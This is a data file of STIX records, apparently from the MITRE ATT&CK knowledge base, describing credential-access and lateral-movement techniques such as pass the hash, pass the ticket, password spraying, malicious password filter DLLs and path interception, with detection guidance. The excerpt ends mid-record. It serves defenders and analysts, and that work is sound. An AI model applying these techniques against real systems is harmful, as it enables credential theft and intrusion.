    "{\"created\":\"2017-05-31T21:30:59.339Z\",\"external_references\":[{\"external_id\":\"T1075\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1075\"},{\"external_id\":\"CAPEC-644\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/644.html\"},{\"description\":\"National Security Agency/Central Security Service Information Assurance Directorate. (2015, August 7). Spotting the Adversary with Windows Event Log Monitoring. Retrieved September 6, 2018.\",\"source_name\":\"NSA Spotting\",\"url\":\"https://apps.nsa.gov/iaarchive/library/reports/spotting-the-adversary-with-windows-event-log-monitoring.cfm\"}],\"id\":\"attack-pattern--c23b740b-a42b-47a1-aec2-9d48ddd547ff\",\"modified\":\"2020-01-30T19:55:38.699Z\",\"name\":\"Pass the Hash\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-30T16:36:51.184Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user\'s cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\\n\\nWindows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.(Citation: NSA Spotting)\",\"external_references\":[{\"external_id\":\"T1550.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1550/002\"},{\"external_id\":\"CAPEC-644\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/644.html\"},{\"description\":\"National Security Agency/Central Security Service Information Assurance Directorate. (2015, August 7). Spotting the Adversary with Windows Event Log Monitoring. Retrieved September 6, 2018.\",\"source_name\":\"NSA Spotting\",\"url\":\"https://apps.nsa.gov/iaarchive/library/reports/spotting-the-adversary-with-windows-event-log-monitoring.cfm\"}],\"id\":\"attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T16:24:34.766Z\",\"name\":\"Pass the Hash\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Travis Smith, Tripwire\"],\"x_mitre_data_sources\":[\"Authentication logs\"],\"x_mitre_defense_bypassed\":[\"System Access Controls\"],\"x_mitre_detection\":\"Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:11.623Z\",\"external_references\":[{\"external_id\":\"T1097\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1097\"},{\"external_id\":\"CAPEC-645\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/645.html\"},{\"description\":\"Metcalf, S. (2014, November 22). Mimikatz and Active Directory Kerberos Attacks. Retrieved June 2, 2016.\",\"source_name\":\"ADSecurity AD Kerberos Attacks\",\"url\":\"https://adsecurity.org/?p=556\"},{\"description\":\"Deply, B. (2014, January 13). Pass the ticket. Retrieved June 2, 2016.\",\"source_name\":\"GentilKiwi Pass the Ticket\",\"url\":\"http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos\"},{\"description\":\"Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December 4, 2014.\",\"source_name\":\"Campbell 2014\",\"url\":\"http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf\"},{\"description\":\"Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.\",\"source_name\":\"CERT-EU Golden Ticket Protection\",\"url\":\"https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf\"}],\"id\":\"attack-pattern--a257ed11-ff3b-4216-8c9d-3938ef57064c\",\"modified\":\"2020-01-30T19:57:16.037Z\",\"name\":\"Pass the Ticket\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-30T17:03:43.072Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account\'s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\\n\\nIn this technique, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user\'s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\\n\\n[Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\\n\\n[Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\",\"external_references\":[{\"external_id\":\"T1550.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1550/003\"},{\"external_id\":\"CAPEC-645\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/645.html\"},{\"description\":\"Metcalf, S. (2014, November 22). Mimikatz and Active Directory Kerberos Attacks. Retrieved June 2, 2016.\",\"source_name\":\"ADSecurity AD Kerberos Attacks\",\"url\":\"https://adsecurity.org/?p=556\"},{\"description\":\"Deply, B. (2014, January 13). Pass the ticket. Retrieved June 2, 2016.\",\"source_name\":\"GentilKiwi Pass the Ticket\",\"url\":\"http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos\"},{\"description\":\"Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December 4, 2014.\",\"source_name\":\"Campbell 2014\",\"url\":\"http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf\"},{\"description\":\"Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.\",\"source_name\":\"CERT-EU Golden Ticket Protection\",\"url\":\"https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf\"}],\"id\":\"attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-12T17:03:16.122Z\",\"name\":\"Pass the Ticket\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Vincent Le Toux\",\"Ryan Becwar\"],\"x_mitre_data_sources\":[\"Authentication logs\"],\"x_mitre_defense_bypassed\":[\"System Access Controls\"],\"x_mitre_detection\":\"Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\\n\\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \\\"Integrity check on decrypted field failed\\\" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Kerberos authentication enabled\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:38:56.197Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.\",\"external_references\":[{\"external_id\":\"T1110.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1110/002\"},{\"description\":\"Wikipedia. (n.d.). Password cracking. Retrieved December 23, 2015.\",\"source_name\":\"Wikipedia Password cracking\",\"url\":\"https://en.wikipedia.org/wiki/Password_cracking\"}],\"id\":\"attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T20:01:56.911Z\",\"name\":\"Password Cracking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication logs\",\"Office 365 account logs\"],\"x_mitre_detection\":\"It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"Azure\",\"Office 365\",\"Azure AD\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1174\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1174\"},{\"description\":\"Fuller, R. (2013, September 11). Stealing passwords every time they change. Retrieved November 21, 2017.\",\"source_name\":\"Carnal Ownage Password Filters Sept 2013\",\"url\":\"http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html\"},{\"description\":\"Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.\",\"source_name\":\"Clymb3r Function Hook Passwords Sept 2013\",\"url\":\"https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/\"}],\"id\":\"attack-pattern--b8c5c9dd-a662-479d-9428-ae745872537c\",\"modified\":\"2020-02-11T19:06:18.818Z\",\"name\":\"Password Filter DLL\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-11T19:05:45.829Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \\n\\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \\n\\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)\",\"external_references\":[{\"external_id\":\"T1556.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1556/002\"},{\"description\":\"Fuller, R. (2013, September 11). Stealing passwords every time they change. Retrieved November 21, 2017.\",\"source_name\":\"Carnal Ownage Password Filters Sept 2013\",\"url\":\"http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html\"},{\"description\":\"Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.\",\"source_name\":\"Clymb3r Function Hook Passwords Sept 2013\",\"url\":\"https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/\"}],\"id\":\"attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-25T20:59:05.209Z\",\"name\":\"Password Filter DLL\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Vincent Le Toux\"],\"x_mitre_data_sources\":[\"File monitoring\",\"DLL monitoring\"],\"x_mitre_detection\":\"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\Notification Packages</code>) and correlate then investigate the DLL files these files reference.\\n\\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:38:22.617Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target\'s policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\\n\\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization\'s login failure policies. (Citation: Cylance Cleaver)\\n\\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\\n\\n* SSH (22/TCP)\\n* Telnet (23/TCP)\\n* FTP (21/TCP)\\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\\n* LDAP (389/TCP)\\n* Kerberos (88/TCP)\\n* RDP / Terminal Services (3389/TCP)\\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\\n* MSSQL (1433/TCP)\\n* Oracle (1521/TCP)\\n* MySQL (3306/TCP)\\n* VNC (5900/TCP)\\n\\nIn addition to management services, adversaries may \\\"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\\\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\\n\\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \\\"logon failure\\\" event ID 4625.\",\"external_references\":[{\"external_id\":\"T1110.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1110/001\"},{\"description\":\"Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017.\",\"source_name\":\"Cylance Cleaver\",\"url\":\"https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf\"},{\"description\":\"US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.\",\"source_name\":\"US-CERT TA18-068A 2018\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA18-086A\"}],\"id\":\"attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-29T17:11:46.504Z\",\"name\":\"Password Guessing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Microsoft Threat Intelligence Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"Office 365 account logs\"],\"x_mitre_detection\":\"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"Office 365\",\"GCP\",\"Azure AD\",\"AWS\",\"Azure\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as \'pass123\'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\\n\\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>.(Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)\",\"external_references\":[{\"external_id\":\"T1201\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1201\"},{\"description\":\"Matutiae, M. (2014, August 6). How to display password policy information for a user (Ubuntu)?. Retrieved April 5, 2018.\",\"source_name\":\"Superuser Linux Password Policies\",\"url\":\"https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu\"},{\"description\":\"Holland, J. (2016, January 25). User password policies on non AD machines. Retrieved April 5, 2018.\",\"source_name\":\"Jamf User Password Policies\",\"url\":\"https://www.jamf.com/jamf-nation/discussions/18574/user-password-policies-on-non-ad-machines\"}],\"id\":\"attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T17:17:42.457Z\",\"name\":\"Password Policy Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Sudhanshu Chauhan, @Sudhanshu_C\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor processes for tools and command line arguments that may indicate they\'re being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-02-11T18:39:25.122Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. \'Password01\'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\\n\\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\\n\\n* SSH (22/TCP)\\n* Telnet (23/TCP)\\n* FTP (21/TCP)\\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\\n* LDAP (389/TCP)\\n* Kerberos (88/TCP)\\n* RDP / Terminal Services (3389/TCP)\\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\\n* MSSQL (1433/TCP)\\n* Oracle (1521/TCP)\\n* MySQL (3306/TCP)\\n* VNC (5900/TCP)\\n\\nIn addition to management services, adversaries may \\\"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\\\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\\n\\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \\\"logon failure\\\" event ID 4625.\",\"external_references\":[{\"external_id\":\"T1110.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1110/003\"},{\"description\":\"Thyer, J. (2015, October 30). Password Spraying & Other Fun with RPCCLIENT. Retrieved April 25, 2017.\",\"source_name\":\"BlackHillsInfosec Password Spraying\",\"url\":\"http://www.blackhillsinfosec.com/?p=4645\"},{\"description\":\"US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.\",\"source_name\":\"US-CERT TA18-068A 2018\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA18-086A\"},{\"description\":\"Metcalf, S. (2018, May 6). Trimarc Research: Detecting Password Spraying with Security Event Auditing. Retrieved January 16, 2019.\",\"source_name\":\"Trimarc Detecting Password Spraying\",\"url\":\"https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing\"}],\"id\":\"attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-29T17:13:57.172Z\",\"name\":\"Password Spraying\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Microsoft Threat Intelligence Center (MSTIC)\",\"John Strand\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"Office 365 account logs\"],\"x_mitre_detection\":\"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.\\n\\nConsider the following event IDs:(Citation: Trimarc Detecting Password Spraying)\\n\\n* Domain Controllers: \\\"Audit Logon\\\" (Success & Failure) for event ID 4625.\\n* Domain Controllers: \\\"Audit Kerberos Authentication Service\\\" (Success & Failure) for event ID 4771.\\n* All systems: \\\"Audit Logon\\\" (Success & Failure) for event ID 4648.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:36.140Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated. Please use [Path Interception by PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007), [Path Interception by Search Order Hijacking](https://attack.mitre.org/techniques/T1574/008), and/or [Path Interception by Unquoted Path](https://attack.mitre.org/techniques/T1574/009).**\\n\\nPath interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)\\n\\nThere are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\\n\\n### Unquoted Paths\\nService paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\\\unsafe path with space\\\\program.exe</code> vs. <code>\\\"C:\\\\safe path with space\\\\program.exe\\\"</code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\\\program files\\\\myapp.exe</code>, an adversary may create a program at <code>C:\\\\program.exe</code> that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)\\n\\n### PATH Environment Variable Misconfiguration\\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\\\system32</code> (e.g., <code>C:\\\\Windows\\\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\\n\\nFor example, if <code>C:\\\\example path</code> precedes <code>C:\\\\Windows\\\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\\\example path</code> will be called instead of the Windows system \\\"net\\\" when \\\"net\\\" is executed from the command-line.\\n\\n### Search Order Hijacking\\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program\'s directory.\\n\\nFor example, \\\"example.exe\\\" runs \\\"cmd.exe\\\" with the command-line argument <code>net user</code>. An adversary may place a program called \\\"net.exe\\\" within the same directory as example.exe, \\\"net.exe\\\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \\\"net.com\\\" in the same directory as \\\"net.exe\\\", then <code>cmd.exe /C net user</code> will execute \\\"net.com\\\" instead of \\\"net.exe\\\" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)\\n\\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).\",\"external_references\":[{\"external_id\":\"T1034\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1034\"},{\"external_id\":\"CAPEC-159\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/159.html\"},{\"description\":\"Nagaraju, S. (2014, April 8). MS14-019 – Fixing a binary hijacking via .cmd or .bat file. Retrieved July 25, 2016.\",\"source_name\":\"TechNet MS14-019\",\"url\":\"https://blogs.technet.microsoft.com/srd/2014/04/08/ms14-019-fixing-a-binary-hijacking-via-cmd-or-bat-file/\"},{\"description\":\"Microsoft. (n.d.). CurrentControlSet\\\\Services Subkey Entries. Retrieved November 30, 2014.\",\"source_name\":\"Microsoft Subkey\",\"url\":\"http://support.microsoft.com/KB/103000\"},{\"description\":\"Baggett, M. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved December 4, 2014.\",\"source_name\":\"Baggett 2012\",\"url\":\"https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464\"},{\"description\":\"HackHappy. (2018, April 23). Windows Privilege Escalation – Unquoted Services. Retrieved August 10, 2018.\",\"source_name\":\"SecurityBoulevard Unquoted Services APR 2018\",\"url\":\"https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/\"},{\"description\":\"McFarland, R. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018.\",\"source_name\":\"SploitSpren Windows Priv Jan 2018\",\"url\":\"https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/\"},{\"description\":\"Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.\",\"source_name\":\"Microsoft CreateProcess\",\"url\":\"http://msdn.microsoft.com/en-us/library/ms682425\"},{\"description\":\"Hill, T. (n.d.). Windows NT Command Shell. Retrieved December 5, 2014.\",\"source_name\":\"Hill NT Shell\",\"url\":\"http://technet.microsoft.com/en-us/library/cc723564.aspx#XSLTsection127121120120\"},{\"description\":\"Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.\",\"source_name\":\"Microsoft WinExec\",\"url\":\"http://msdn.microsoft.com/en-us/library/ms687393\"},{\"description\":\"Microsoft. (n.d.). Environment Property. Retrieved July 27, 2016.\",\"source_name\":\"MSDN Environment 